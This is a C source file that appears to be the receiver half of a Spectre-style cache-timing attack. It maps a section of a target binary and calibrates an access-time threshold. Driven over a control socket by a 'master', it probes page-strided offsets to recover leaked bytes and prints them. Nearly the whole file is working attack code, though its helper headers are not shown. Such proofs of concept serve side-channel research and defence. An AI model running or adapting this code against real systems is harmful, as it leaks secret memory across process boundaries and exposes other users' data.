
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <errno.h>
#include <ctype.h>

#include <emmintrin.h>
#include <x86intrin.h>

#include "common.h"
#include "spectre.h"

int x;

int main(int argc, char *argv[])
{
    printf("Attack pid = %d\n", getpid());

    int err;
    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s <binname>\n", argv[0]);
        return EXIT_FAILURE;
    }

    err = set_cpu(0);
    if (err < 0)
        return EXIT_FAILURE;

    uint8_t *array = mapsection(argv[1], TARGET_SECTION, ARRSIZE);
    if (!array)
        return EXIT_FAILURE;

    uint64_t threshold = calculate_threshold(1000000);

    int sock = setup_server(CONTROL_PORT);
    if (sock < 0)
    {
        err = EXIT_FAILURE;
        goto err_quit0;
    }

    int master = accept(sock, NULL, NULL);
    if (master < 0)
    {
        perror("accept");
        err = EXIT_FAILURE;
        goto err_quit1;
    }
    printf("Master connected, starting\n");

    err = 1;
    while (err > 0)
    {
        int requests[REQUEST_SIZE] = {};
        err = recv(master, requests, sizeof(requests), 0);
        if (err < 0)
        {
            err = EXIT_FAILURE;
            perror("recv");
            goto err_quit2;
        }
        else if (err == 0)
        {
            err = EXIT_SUCCESS;
            goto err_quit2;
        }
        usleep(100);

        int found = 0;
        char sym  = '\0';
        for (int i = 1; i < 200; i++)
        {
            uint64_t duration = measure_access_time(&array[i*4096 + OFFSET]);
            if (duration < threshold)
            {
                sym = (isprint(i) ? i : '?');
                found = 1;
                printf("Offset %3d: %c\n", requests[REQUEST_SIZE - 1], sym);
            }
        }
        // printf("Offset %3d: %c (%d)\n", requests[REQUEST_SIZE - 1], sym, idx);
        err = send(master, &found, sizeof(found), 0);
    }


err_quit2:
    close(master);
err_quit1:
    close(sock);
err_quit0:
    munmap(array, ARRSIZE);
    return EXIT_SUCCESS;
}

